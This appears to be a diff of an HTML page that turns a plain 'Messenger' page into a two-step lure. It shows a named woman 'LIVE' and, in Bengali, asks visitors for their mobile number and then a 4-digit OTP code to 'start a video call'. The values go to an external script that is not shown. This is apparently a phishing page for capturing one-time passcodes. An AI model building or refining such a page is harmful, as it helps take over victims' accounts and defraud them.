@@ -3,81 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Messenger</title>
+    <title>Sumaiya Akter Jui - LIVE</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-        }
-        .video-wrapper {
-            margin-bottom: 20px;
-            border-radius: 15px;
-            overflow: hidden;
-            border: 2px solid #e91e63; /* আপনার আগের ডিজাইনের বর্ডার রঙ */
-        }
-        h2 {
-            margin: 10px 0;
-            font-size: 22px;
-            color: #333;
-        }
-        p {
-            color: #666;
-            margin-bottom: 20px;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        .btn {
-            background: linear-gradient(to right, #7b2ff7, #2b6aff);
-            color: white;
-            border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-        }
+        body { font-family: sans-serif; text-align: center; background: #f4f4f4; }
+        .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #e91e63; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="video-wrapper">
-        <iframe 
-            src="https://www.tiktok.com/embed/v2/7432653200923053330" 
-            style="width: 100%; height: 400px; border: none;" 
-            allow="autoplay; encrypted-media" 
-            allowfullscreen>
-        </iframe>
-    </div>
+<div class="card">
+    <img src="ssstik.io_1777744992501.jpeg">
+    <h2 id="title">Sumaiya Akter Jui</h2>
+    <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
 
-    <h2>Sumaiya Akter Jui</h2>
-    <p>নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
+    <form id="mainForm">
+        <div id="step1">
+            <input type="tel" id="phone" placeholder="আপনার মোবাইল নম্বর" required>
+            <button type="button" onclick="goToStep2()">পরবর্তী ধাপ</button>
+        </div>
 
-    <input type="text" placeholder="আপনার মোবাইল নম্বর">
-    <button class="btn">পরবর্তী ধাপ</button>
+        <div id="step2" style="display:none;">
+            <input type="tel" id="otp" placeholder="৪ ডিজিট কোড (OTP)">
+            <button type="submit">ভিডিও কল শুরু করুন ✅</button>
+        </div>
+    </form>
 </div>
 
+<script src="script.js"></script>
 </body>
 </html>
